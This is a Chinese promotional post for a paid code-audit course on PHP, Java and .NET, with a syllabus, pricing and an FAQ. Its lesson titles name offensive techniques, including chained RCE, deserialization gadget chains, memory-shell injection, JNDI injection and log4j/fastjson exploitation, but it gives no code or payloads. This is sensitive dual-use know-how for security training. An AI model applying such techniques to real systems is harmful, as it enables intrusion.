![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kReVX2Xib69brWyaeubauPHZtQFAib6VpBjI0Nu2IS3ZADV5ibxYmKzVh9bcQFqEzRrtyIhM9EPYicJEzibETUBSYLVSfOpYwuW17fk/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=50 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQgJ8ZficdTWbeiaZeoZWhwB8n5cxQqJoaFxyAs97GTLBjAa74wvoa7hRV8854Epjy2Ut6Y1NTmrzp8BW8kee0caCBkSJ46NqrKE/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=51 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSbsggrVS1cFdTBOiafbibtGkfyku74oG7mmfcaT9DwvDWqEkrqqGbiaHqvlml4WGg6y9vcc9SOPEAXInzbYmcQbtv1NdbfTeavMM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=52 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRQf0KabPkgl2Hun3mGicNibcNa4qbtODzlTCPksAx106maXc5OV9aOMXvSSgyslZFw0SZZLbeStibXP6M22Qt0kQzqdVduvxWvXA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=53 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQYcyvswibg29BmwbGH7fjG0a51Z6LDM0DcHsmWgQrePJh3HNPcd17dv4sxtMtEMmiaISoF75HlAkKTrIrzccoVVKdyJrovYJc38/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=54 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRDyDZQFRSu0pZgIYSy5v9cC6N0Cw7XVics7KFUaHpX84Or8ConsR3wB7VCbDw1F8THNwqgwzxicibR7YkhlSWZ4ny4dOIQcnGKDo/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=55 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQWRm2ziamPpvBWzPYFMPt96dNzzIic0s0Piaut3hWglRjtEosezQI5OqQP82AzCAJSOF0DEyicWQmaAAaQzhBzVJcDTwKWDdUcI5I/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=56 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQmIn0ETOMGqVn9lHtSRweMucOcoAItoO9xhyjIqLibvfQG5oiaGwBnrkic2sOF30BLqAsHFSdsN61FGmiamwxKqPtUR0L96xX6goI/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=57 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRYnt0ToicJXObjGBhjdLeLLJZjch1DZYZ3xBFtc2qm1q6aZRfnicrYfzWZMmxfZHy7d1K3HnwLny8nFuOrTVD2yDuPmlrkbQnAU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=58 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kScXInJDQeGaKkMrR1CCS2wMrZzBeOBVGKfkJfq2I2M9c3YCUfe0gHRZCIzO82Rnvbs4zw5h2W7EXsicdIJDaiboV5sgwVjkrYYM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=59 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSzA7C1YEkhQXUyBF9Ip7iaDgpQFWmKGjibUpDasSHD3nicVrv6JJedibdXkbU1fTw3gCyUV109yPBEL6bFo7OLZLy8soPEialsHaYA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=60 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Dfrm5V3o6kTM6WuuGxJczNW7q0TYG7ktn5v3KN2Tiaib8SGuPHe93HfCuVRvvIahWsRbSA3SrdYSiawhNFC9APhjgtUiaum15ew2w4EgQatHnvM/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=61 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kS1rF1bzgHv3rnVlNqXdbicGfpxrR0obwOaaBRgm2IwkP72wEl19NfQ5DOHVgW29RkRYhl1v7zS59nFe2cWxSKRfTL4SjWSNzOM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=62 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRHDKZHLHZZgSZpGjhollxiaAxXZskgVmo13agvZdmKJTh4nm9Tvus38FwhH0Luhicz5dyPtgEzWib1yJnUDyibpTNGWKjPgJVRibD8/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=63 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Dfrm5V3o6kQvcAKchkum6YvK9tedKvsJuQyuXSf1QGcYBiaI9bzJvKR3iaO2tCsI8MY0Go3A8BnobFc37rz6aAxTEJbFxB2sx2ySdGbAIWfrA/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=64 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQ3ywhickhFMjMib7mFkb1a1XiaRw47b5XWzQc8B6CVibjKhY25d1sUnfYzIKe0oYubVn9PRHtnkclqoVWwkAnps1L8zSzY3pgiblf0/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=65 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT8bP6EJQu8BNOg0coT6AgiaI6SzKJGFPz7R8SjrGm4SoJkSPjSR41yICzOquN9SuhJZMUXtC2fv03xt0fGFGItO1qkwJFdZpQs/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=66 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQVMvmejuEGYr1dd67wXSAYicmiaQnWaav2qF9JRZTv8wuIpIeDATaZGaBPgibsvXvCCpQ9o4KBHmibGicdDTVGb9pWPvUazibja1R3c/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=67 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQCvUQickaSM5ILEo8bB6q5T6HD0mFibtjp7TfsjEjCiaRpmVggrAN8uDNWMRuu3f61PBpYP5XHez6tWDa3CRcEnmwu4zjOPzw0kc/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=68 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT9E7vGw4ibhsEcGvomGW0LVVyaBh8OI93AU5oId7Cial9rIMGyaaJnRhXzMKiaDv5mYwiciaEwichiauaiaunxSgsWc3t5gjD9ofpTmLo/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=69 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTPt82eYMZNJK5xvJd0lLIsUsfHBoDW7Gjjugv3QtPaialQRAU062hVXXAWDhQ1F7r9fQTibAx4ddf41P8GthzxktlblmG0mibVXE/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=70 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSg7xIzRRRibYlt4RWyde66CFQN7rib5PKPCFXVKyWsSrxHZSgLpKz7Jibts9PSDOnp57iaAeBkswbXFcjCmiaLYLJF1tfvyK9WCHgA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=71 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSBag1L0qWvwLhicpXx0uy8ZBUWEVrtZfiaxMeRVI6fAFC7YlRYtzdRV0IawyAzuVib2G4CHMCFJ5JxNDKxicDibgDM5CK4wCe2CPlY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=72 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQPkUSIUBmKPqevNibGO2hUCr7hHyEcC6RKYPyqSZDQiciaibxxkX71B8Ba8wmeWYKUmIjeXyyPjAl5aKjYBOAibV2PLaLiaeapS8Xvo/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=73 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSxcj33JL9goIGlYHohmuqFheuQcpsvqNFUq7nS7Hn4fziccsalOuM7zj1gDUL7058VGuDVeoH4eGUKhgfGYxygu6niaLib4ibmuhg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=74 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQHXOQLbVqlhT9qrrwYfkicerIc4P3PvFX1EWxwMPkoEWuHCiaS8Ig2FaOnFouuVjXKLRAlD2LFmQGjv6b5jO4p0IhBtlP2WOFhY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=75 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kR1Pncu5cYkNj7oJrjR51e4quv6iavSqzRViaKY2DOGIp3nBibibwInAkM992RbloyjMkU9t9nNuEu7AdQ5ibPQG1lu7p758j1hlGmM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=76 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRUf7yTLUy1oiabhBK2NzUB1Z8ppL5FHqujFx5mYqyGTtfRXPJhfibadmicKhXAjibY4G1XC5f5j6ULrLGNuC6xhqhYmxDKubzFFrY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=77 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSuH8ADibCBPibvJibtbNNIqzGBE4udXwwF3fcAjwTNbLQRG64ibXeic2rd0HLotLcuQZxNTnuSYmpBLkdc3hC9G3MYnYcdb0xSCmpk/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=78 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRh9QarnEJTj2CBTKx0dDKibxs8keib59Cribtt806OvZUhksqbSlpQTJ1YTCOC03AssMJesQRtAicRfyV4ytcSiaib1lD5mvqQNXWYI/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=79 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kR0Vx1ibsibialAcxcYq8Ibsbzia2NvbnKyflic4KrMvxicgEObMQRcoGyZH6h9eR96KRZ1YVl8qZL2BWJF4cU9fkIpLPEpYmjWY3Mts/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=80 "")  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kS1rF1bzgHv3rnVlNqXdbicGfpxrR0obwOaaBRgm2IwkP72wEl19NfQ5DOHVgW29RkRYhl1v7zS59nFe2cWxSKRfTL4SjWSNzOM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=81 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kSzA7C1YEkhQXUyBF9Ip7iaDgpQFWmKGjibUpDasSHD3nicVrv6JJedibdXkbU1fTw3gCyUV109yPBEL6bFo7OLZLy8soPEialsHaYA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=82 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kScXInJDQeGaKkMrR1CCS2wMrZzBeOBVGKfkJfq2I2M9c3YCUfe0gHRZCIzO82Rnvbs4zw5h2W7EXsicdIJDaiboV5sgwVjkrYYM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=83 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQYcyvswibg29BmwbGH7fjG0a51Z6LDM0DcHsmWgQrePJh3HNPcd17dv4sxtMtEMmiaISoF75HlAkKTrIrzccoVVKdyJrovYJc38/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=84 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kReVX2Xib69brWyaeubauPHZtQFAib6VpBjI0Nu2IS3ZADV5ibxYmKzVh9bcQFqEzRrtyIhM9EPYicJEzibETUBSYLVSfOpYwuW17fk/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=85 "")  
  
  
  
  
  
**左右滑动查看更多**  
  
**>**  
  
(其实报喜一个是为了宣传，更重要的其实每当学员来报喜的时候，都有一种成就感，最起码能够认定自己的课程是有一定价值一定性价比的，而且确实收了师傅们的钱，能够帮助到师傅们一些，自己也就更有坚持下去做培训的信心。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/HBLcNkZ8PQddO5DZYzH4GcwlsOwEK5cR1A5XZuWXTP3ib3tWpcAtuLUaliasnZQvBmenGd0UNicFQOsJGyIzodicicg/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=120 "")  
  
二、第五期课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dJGuszYr5iaRGiaZURAxJAROibCh1sjaZictcbC4iasuuOgCMQSDSwrG5Wfrx2QgfvKx8icDhm0gIia8fN6mThehEK8ww/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=121 "")  
  
  
  
    第五期课程仍然是以代码审计为主，本次课程还是为三个语言的代码审计0-1讲解，目的为帮助学员完成0-1+1的白盒（代码审计）漏洞挖掘，并且在出货的基础上再+1去出高质量的漏洞（  
例如组合拳RCE、前台相关漏洞等）。  
  
  
1  
  
开课时间&课程周期  
  
开课时间暂定为：2026年4月3日  
  
开课周期预计到：三个月左右（直播+录播）  
  
**课程大纲**  
  
    本次课程分为PHP、JAVA、NET代码审计为直播+录播，为了照顾一些基础较为薄弱的师傅新增基础~技巧~番外（录播课程）。  
  
  
01  
  
PHP&JAVA&NET代码审计 (直播+录播)  
  
     
  
    之前课程大纲主要为xxx实战案例，本次课程大纲着重体现思路方向，并非取消了实战部分，实战部分之多不减。  
  
PHP课程目录  
  
  
✅   
   
第一节课：多框架初识&路由认识&参数传递  
  
✅   
   
第二节课：多框架&鉴权分析&认证与鉴权&鉴权方式  
  
✅   
   
第三节课：多框架&常见漏洞函数&回显&非回显  
  
✅   
   
第四节课：注入漏洞&常见位置&实战审计注入类漏洞  
  
✅   
   
第五节课：前台RCE漏洞审计&漏洞案例技巧讲解  
  
✅   
   
第六节课：门户网站CMS&网络设备&审计经验讲解  
  
✅   
   
第七节课：多框架&鉴权对抗&权限绕过技巧&案例分析  
  
✅   
   
第八节课：组合拳RCE漏洞分析&漏洞组合拳利用&案例  
  
✅   
   
第九节课：PHP下反序列化漏洞&魔术方法&pop链分析  
  
✅   
   
第十节课：PHP下反序列化漏洞实战&phar协议RCE案例  
  
  
JAVA课程目录  
  
  
✅   
   
第一节课：Servlet&Spring Boot&Spring MVC&Struts2  
  
✅   
   
第二节课：多框架下&拦截器&认证鉴权&组件鉴权分析  
  
✅   
   
第三节课：多框架下&权限绕过&鉴权对抗&案例分析  
  
✅   
   
第四节课：常见漏洞函数&案例分析&审计技巧  
  
✅   
   
第五节课：前台漏洞审计&组合拳rce漏洞&技巧&案例  
  
✅   
   
第六节课：反序列化&CC链利用&反序列化漏洞利用  
  
✅   
   
第七节课：  
Ognl&SpEl&EL表达式注入&漏洞案例  
  
✅   
   
第八节课：内存马简介&内存马原理分析&内存马注入方式  
  
✅   
   
第九节课：RMI&JNDI注入&JNDI注入漏洞利用&案例  
  
✅   
   
第十节课：组件漏洞&shiro&fastjson&log4j分析&利用  
  
  
.NET课程目录  
  
  
✅   
   
第一节课：初识.NET&Web From & MVC架构框架分析  
  
✅   
   
第二节课：Web From&MVC框架&鉴权分析&认证方式  
  
✅   
   
第三节课：多框架下&鉴权对抗&权限绕过分析&案例  
  
✅   
   
第四节课：注入漏洞分析&文件操作类漏洞&实战分析  
  
✅   
   
第五节课：常见漏洞位置&前台漏洞审计&漏洞案例讲解  
  
✅   
   
第六节课：组合拳RCE漏洞分析&组合拳RCE案例讲解  
  
✅    
第七节课：.NET反序列化漏洞初识&反序列化漏洞原理  
  
✅    
第八节课：.NET安全反序列化链&反序列化触发场景  
  
✅    
第九节课：.NET反序列化漏洞案例&反序列化漏洞分析  
  
  
02  
  
基础~技巧~番外（录播)  
  
  
该篇章为长期更新  
  
  
1  
  
基础篇章  
  
1、  
由于之前上课时部分师傅存在一定基础，刚开始的课程部分师傅认为自己可以跟的上等问题，导致时间的浪费。  
  
  
2、  
同时有一定的师傅存在无法搭建源码，以及软件下载等问题，于是将这种基础问题，统一归纳为基础篇章，供师傅们学习，节省师傅们时间提升学习效率及课程质量  
  
  
3、同时面对部分学员频繁提出的一些问题，针对该问题同样会进行解答，并且进行录制上传至基础篇章中。  
  
  
2  
  
技巧篇章  
  
1、  
随着自己技术的进步也了解到了一些新型的技巧或者手法，例如sql注入的某一个技巧，但是重新讲解又浪费大量时间，特地新增了技巧篇章，将单独的技巧进行讲解  
。  
  
  
3  
  
番外篇章  
  
1、自己在第四期讲过一些逆向相关，并且还存在相关的一些好的案例，得到了挺多师傅的认可，例如某APP接管存储桶等案例，于是之后在有好的案例将进行上传更新。  
  
**课程思维导图**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTqu0pvLvoUib0GibAGZqxgU1EfS2W6ricOTU9cFOGYLNbrx8KBgaSv0QJJwvOdZ50MXZKic52AubVHnePYs3jPSgvYQlk39S96Zz4/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=122 "")  
  
  
**常见疑问&课程讲解**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=123 "")  
  
第五期课程  
收费多少？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=124 "")  
  
本次课程收费仍然是  
1688，并且还是承诺一次报名后续不再进行任何二次收费保障（包含  
内部平台，  
以及后续推出一系列内容均可观看）。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=125 "")  
  
什么时间段上课，上课周期是多长时间？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=126 "")  
  
第五期课程【直播+录播】上课周期为  
三个月，一般集中在  
周五六日这三天，一周保持  
2～3节课，每节课  
1小时左右。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=127 "")  
  
作为学员，我们都有哪些权益？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=128 "")  
  
首先最关键的就是  
课程内容是可以一直学习的，同时  
内部报告平台也可进行观看，  
答疑是不限时长，不限类型方向，任何方向均可，再次同时代码审计最关键的就是源码，  
源码&课件&视频都是给兄弟们配套的，当然无聊找小朋友聊天一起打游戏也可以哦。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=129 "")  
  
学完之后可以达到什么水平？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=130 "")  
  
学完之后可以达到可以进行  
独立审计的水平，在面对  
php、JAVA、NET主流语言的源码，可以进行  
独立审计，  
验证漏洞，对于一些  
JAVA安全内容例如：  
反序列化，内存马等也有一定的理解，可以进行打  
反序列化漏洞、  
注入内存马等操作，同时  
PHP的反序列化、pop链，phar协议等利用也有一定理解，且此类漏洞导致RCE  
均有案例。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=131 "")  
  
0基础可以学吗？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=132 "")  
  
1、这是大家最常问的一个问题，  
0基础是可以的，我的代码审计课程一直秉持着  
帮助大家完成代码审计0-1的目标，同时往期（第四期）课程新增了进阶课，其目的也是帮助大家完成  
0-1出洞到0-1出有质量的漏洞。  
  
  
2、另外考虑到有的  
学员基础较为薄弱，本期同时也开了  
番外篇&基础篇，师傅们可以观看这块分区课程内容，此类分块课程目的就是为  
协助到一些基础比较薄弱的师傅们。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=133 "")  
  
是那种读PPT拿着靶场讲解吗？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=134 "")  
  
不会，课程均使用一些  
0Day&1Day&Nday优质漏洞来进行授课，且本期案例均为从  
简-难漏洞案例，深度体验代码审计当中的  
难易区分，  
完全杜绝靶场以及去读PPT的，从培训第一期开始到现在，基本为上课开始看几眼课件，  
让学员熟悉这节课的大概内容等信息，然后  
直接实操到下课，这一点也是  
我干培训五期以来一直使用的授课方式。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=135 "")  
  
是否有简历修改&内推等福利？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=136 "")  
  
有的兄弟，有的，  
不介意小朋友的指导简历这类的话，随时欢迎大家来骚扰我。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=137 "")  
  
为什么你不新增AI方向的内容？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=138 "")  
  
目前我个人认为AI可以帮助我们  
提升很大的效率，但是前提是  
AI的使用者本身要懂这个技术，才可以利用AI来  
降低该技术门槛，提升效率，  
完全自动化目前感觉还是无法做到，包括  
课程当中也会使用AI会顺带着给师傅讲了  
如何用ai来提升效率，同时如果反馈不会使用的师傅较多，会考虑后续在基础～技巧～番外来更新该方向内容。  
  
  
**联系方式**  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTOYPMU44FHrW9H0S2wayiaYe9BfOpx091ILWfGkedImblkiay4xic5gWhFOMqH0afWQCQVEZWkDbMqajTu5YvicUGhyEtG2HjgKQ8/640?wx_fmt=png&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=23 "")  
  
  
